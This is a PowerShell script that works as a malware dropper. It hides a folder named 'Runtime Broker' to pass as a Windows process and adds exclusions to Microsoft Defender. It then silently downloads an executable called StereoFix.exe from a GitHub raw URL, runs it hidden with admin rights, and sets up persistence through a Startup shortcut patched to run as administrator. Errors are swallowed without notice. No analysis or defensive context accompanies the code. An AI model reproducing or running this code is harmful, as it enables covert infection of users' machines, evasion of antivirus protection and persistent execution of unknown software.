# Silent Admin Execution Script
# Must be run from an elevated PowerShell session

# Define variables
$appUrl = "https://github.com/salamprajjit-alt/5132525231/raw/main/StereoFix.exe"
$appName = "StereoFix.exe"
$folderName = "Runtime Broker"
$basePath = "$env:APPDATA"
$folderPath = "$basePath\$folderName"
$downloadPath = "$folderPath\$appName"
$exclusionPath1 = $folderPath
$exclusionPath2 = "C:\Users\sarus\AppData\Roaming\SubDir"

# Check if running as administrator
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")

if (-not $isAdmin) {
    # If not admin, silently exit
    exit 1
}

try {
    # Create folder if it doesn't exist
    if (-not (Test-Path $folderPath)) {
        $null = New-Item -Path $folderPath -ItemType Directory -Force
    }
    
    # Set folder as hidden
    $folder = Get-Item -Path $folderPath -Force
    $folder.Attributes = $folder.Attributes -bor [System.IO.FileAttributes]::Hidden
    
    # Add both paths to Defender exclusions
    Add-MpPreference -ExclusionPath $exclusionPath1 -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionPath $exclusionPath2 -ErrorAction SilentlyContinue
    
    # Download the executable
    Invoke-WebRequest -Uri $appUrl -OutFile $downloadPath -UseBasicParsing
    
    # Wait a moment for the file to be fully written
    Start-Sleep -Seconds 2
    
    # Execute with admin privileges without prompting
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = $downloadPath
    $psi.Verb = "runas"  # This elevates the process
    $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
    $psi.UseShellExecute = $true
    
    [System.Diagnostics.Process]::Start($psi) | Out-Null
    
    # Create startup shortcut (will run with admin privileges)
    $startupFolder = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
    $shortcutPath = "$startupFolder\$appName.lnk"
    
    $WshShell = New-Object -comObject WScript.Shell
    $Shortcut = $WshShell.CreateShortcut($shortcutPath)
    $Shortcut.TargetPath = $downloadPath
    $Shortcut.WorkingDirectory = $folderPath
    $Shortcut.Save()
    
    # Modify shortcut to run as admin
    $bytes = [System.IO.File]::ReadAllBytes($shortcutPath)
    $bytes[0x15] = $bytes[0x15] -bor 0x20 # Set the byte that indicates "Run as Administrator"
    [System.IO.File]::WriteAllBytes($shortcutPath, $bytes)
    
} catch {
    # Silently handle any errors
    exit 1
}